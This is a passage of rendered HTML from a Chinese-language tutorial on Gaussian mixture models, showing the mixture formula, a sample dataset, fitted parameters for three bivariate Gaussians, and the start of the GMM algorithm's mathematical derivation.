style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mord">∣</span><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></div>
<p>其中，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\pi_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>表示第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>个高斯分布的权重系数，并且满足<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mi>i</mi></msub><mo>≥</mo><mn>0</mn><mo separator="true">,</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup><msub><mi>π</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\pi_{i} \ge 0, \sum_{i=1}^{k} \pi_{i} = 1 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2887em;vertical-align:-0.2997em;"/><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></p>
<hr/>
<p>基于前面介绍的理论基础，现在我们就以二维概率分布 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span></span></span></span></span> 为例，来可视化演示如何用多个高斯分布对其逼近与分解。</p>
<p>值得注意的是，这类分解<strong>并不像泰勒展开那样存在确定的数学解析解</strong>。由于我们面对的是一个由多个高斯成分叠加而成的混合模型，其参数估计问题没有闭式解，通常只能通过<strong>迭代优化</strong>的方法寻找似然函数的一个局部最优解。而这个迭代优化方法的名称就是<strong>高斯混合模型（GMM）聚类算法</strong></p>
<p>在实际应用中，我们往往无法直接获得真实分布 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span></span></span></span></span> 的解析形式，而是通过采样获得有限的数据样本。例如，假设我们通过观测采样得到如下数据集：</p>



































<table><thead><tr><th>样本</th><th>特征1</th><th>特征2</th></tr></thead><tbody><tr><td>样本1</td><td>0.6</td><td>1.1</td></tr><tr><td>样本2</td><td>3.6</td><td>2.5</td></tr><tr><td>样本3</td><td>2.8</td><td>3.3</td></tr><tr><td>样本4</td><td>0.1</td><td>2.7</td></tr><tr><td>...</td><td/><td/></tr></tbody></table>
<p>将全部数据绘制在二维平面上，可得到如下散点图：</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c00dd313476f461ebc7fa0f9a83f6bda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=r%2F53pTNApyrm0t9AnGxZCc154Ko%3D" alt="c7.jpg" loading="lazy"/></p>
<p>从散点图中虽然难以精确判断数据应由几个二元高斯分布混合而成，但可大致观察到数据似乎围绕<strong>三个中心</strong>聚集。因此，我们<strong>假设</strong>混合成分数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">k = 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">3</span></span></span></span></span>，并运用 GMM 聚类算法对该分布进行拟合分解。算法运行后，我们得到三个二元高斯分布的参数估计：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0.4</mn><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>∣</mo><mo stretchy="false">[</mo><mn>0.04</mn><mo separator="true">,</mo><mn>0.04</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><msub><mi mathvariant="normal">Σ</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mn>0.29</mn><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>∣</mo><mo stretchy="false">[</mo><mn>1.92</mn><mo separator="true">,</mo><mn>3.18</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><msub><mi mathvariant="normal">Σ</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mn>0.31</mn><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>∣</mo><mo stretchy="false">[</mo><mo>−</mo><mn>0.98</mn><mo separator="true">,</mo><mn>2.03</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><msub><mi mathvariant="normal">Σ</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x}) = 0.4 \mathcal{N}(\mathbf{x} \mid  [0.04,0.04],\Sigma_1) + 0.29 \mathcal{N}(\mathbf{x} \mid  [1.92,3.18],\Sigma_2)+0.31 \mathcal{N}(\mathbf{x} \mid  [-0.98,2.03],\Sigma_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.4</span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0.04</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0.04</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.29</span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">1.92</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">3.18</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.31</span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">−</span><span class="mord">0.98</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2.03</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="normal">Σ</mi><mn>1</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0.8</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0.8</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\Sigma_1 = \begin{bmatrix}
 1 &amp; 0.8\\
 0.8 &amp;1
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0.8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0.8</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="normal">Σ</mi><mn>2</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1.5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.6</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.6</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1.5</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\Sigma_2 = \begin{bmatrix}
 1.5 &amp; -0.6\\
-0.6 &amp;1.5
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1.5</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">−</span><span class="mord">0.6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">−</span><span class="mord">0.6</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1.5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="normal">Σ</mi><mn>3</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0.8</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0.8</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\Sigma_3 = \begin{bmatrix}
 0.8 &amp; 0\\
0 &amp;0.8
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0.8</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0.8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></div>
<p>可视化后如下图所示：</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e78a986956a049219c6f2f817d0f6d1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=OdEVfUEWAZWDnrETYFCBh5yC%2Fc0%3D" alt="c8.jpg" loading="lazy"/></p>
<hr/>
<p>接下来，我们将深入讲解GMM聚类算法的数学流程。如果你对下面的数学公式感到头大，也不必担心，你可以直接跳过这一小节，去学习GMM聚类算法的工具库。毕竟在大多数情况下，我们只要会用工具就行了，没必要知道工具是如何运作的。但是如果有能力的话，还是推荐你尝试理解一下，看看别人的设计思想，以后自己设计新算法或进行理论创新时也有个参考。</p>
<p>假设我们有一个包含 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">m</span></span></span></span></span> 个 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> 维样本的数据集 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">X</mi><mo>=</mo><mrow><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow></msup></mrow></mrow><annotation encoding="application/x-tex">\mathbf{X} = {\mathbf{x}^{(1)}, \mathbf{x}^{(2)}, ..., \mathbf{x}^{(m)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6861em;"/><span class="mord mathbf">X</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">2</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">m</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span></span>，可以表示为形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span> 的矩阵。我们的目标是将数据分布分解为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 个 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> 维高斯分布的线性组合。记第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> 个高斯分布为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>∣</mo><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Σ</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(\mathbf{x} \mid \boldsymbol{\mu}_j, \Sigma_j)</annotation></semantics></math></span><span 